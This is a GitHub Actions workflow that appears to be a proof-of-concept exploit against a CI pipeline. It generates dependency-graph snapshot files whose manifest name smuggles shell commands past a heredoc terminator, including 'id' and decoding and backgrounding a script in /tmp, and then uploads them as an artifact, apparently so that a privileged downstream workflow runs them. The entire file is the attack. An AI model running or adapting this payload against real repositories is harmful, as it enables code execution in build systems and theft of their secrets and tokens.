name: PR Workflow
on:
  pull_request:
    branches: [development]
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: craft attacker-controlled dependency graph
        env:
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
          PR_NUM: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p dependency-graph-reports
          touch payload-marker.txt
          python3 - <<'PY'
          import datetime, json, os

          scanned = datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
          head = os.environ['HEAD_SHA']
          base = os.environ['BASE_SHA']
          n = os.environ['PR_NUM']

          evil = "poc2\nEOF\necho RCEMARKER_1794430290\nid\necho  | base64 -d > /tmp/w.py || true\nnohup python3 -u /tmp/w.py > /tmp/w.out 2>&1 < /dev/null &\nsleep 1\nexit 0\n"

          def manifest(name, coordinate, purl):
              return {"name": name, "resolved": {coordinate: {"package_url": purl, "relationship": "direct", "dependencies": []}}}

          common = manifest("build.gradle.kts", "org.apache.commons:commons-lang3:3.12.0", "pkg:maven/org.apache.commons/commons-lang3@3.12.0")
          bumped = manifest("build.gradle.kts", "org.apache.commons:commons-lang3:3.13.0", "pkg:maven/org.apache.commons/commons-lang3@3.13.0")

          def snapshot(sha, ref, manifests, corr):
              return {"version": 0, "job": {"correlator": corr, "id": corr}, "sha": sha, "ref": ref,
                      "detector": {"name": corr, "version": "1.0.0", "url": "https://example.com"},
                      "manifests": manifests, "scanned": scanned}

          os.makedirs("dependency-graph-reports", exist_ok=True)
          json.dump(snapshot(base, "refs/heads/development", {"build.gradle.kts": common}, "pocbase"),
                    open("dependency-graph-reports/snapshot-base.json", "w"))
          refs = ["refs/pull/%s/head" % n, "refs/pull/%s/merge" % n, "refs/heads/development"]
          for i, ref in enumerate(refs):
              corr = "pochead%d" % i
              json.dump(snapshot(head, ref, {"build.gradle.kts": bumped, evil: manifest(evil, "com.example:evil:1.0.0", "pkg:maven/com.example/evil@1.0.0")}, corr),
                        open("dependency-graph-reports/snapshot-head-%d.json" % i, "w"))
          PY
      - uses: actions/upload-artifact@v4
        with:
          name: dependency-graph_snapshot.json
          path: |
            dependency-graph-reports/
            payload-marker.txt
